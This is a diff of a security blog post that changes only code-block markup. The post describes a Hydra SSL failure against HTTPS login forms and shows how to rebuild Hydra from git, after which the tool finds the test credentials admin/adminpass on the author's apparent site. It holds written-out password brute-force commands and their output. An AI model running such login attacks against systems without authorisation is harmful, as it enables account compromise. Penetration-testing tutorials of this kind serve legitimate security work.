@@ -15,15 +15,16 @@ summary:
 </p>
 <p>
 So if you see something along the lines of this
-<code>
+{% highlight bash %}
 root@kali:~# hydra -s 443 -S -l admin -p adminpass necurity.co.uk  https-post-form  "/php/a:user=^USER^&pass=^PASS^:DENIED"
 [VERBOSE] Could not create an SSL session: error:14077410:SSL routines:SSL23_GET_SERVER_HELLO:sslv3 alert handshake failure
 1 of 1 target completed, 0 valid passwords found
 Hydra (http://www.thc.org/thc-hydra) finished at 2015-03-24 21:52:57
-</code>
+{% endhighlight %}
 
 Then grab the latest version from git and enjoy breaking in once more
-<code>
+
+{% highlight bash %}
 root@kali:~/git# git clone git@github.com:vanhauser-thc/thc-hydra.git
 root@kali:~/git# cd thc-hydra/
 root@kali:~/git/thc-hydra# ./configure 
@@ -32,7 +33,7 @@ root@kali:~/git/thc-hydra# ./hydra -s 443 -S -l admin -p adminpass necurity.co.u
 [443][http-post-form] host: necurity.co.uk   login: admin   password: adminpass
 1 of 1 target successfully completed, 1 valid password found
 Hydra (http://www.thc.org/thc-hydra) finished at 2015-03-24 21:57:29
-</code>
+{% endhighlight %}
 </p>
 
 <p>
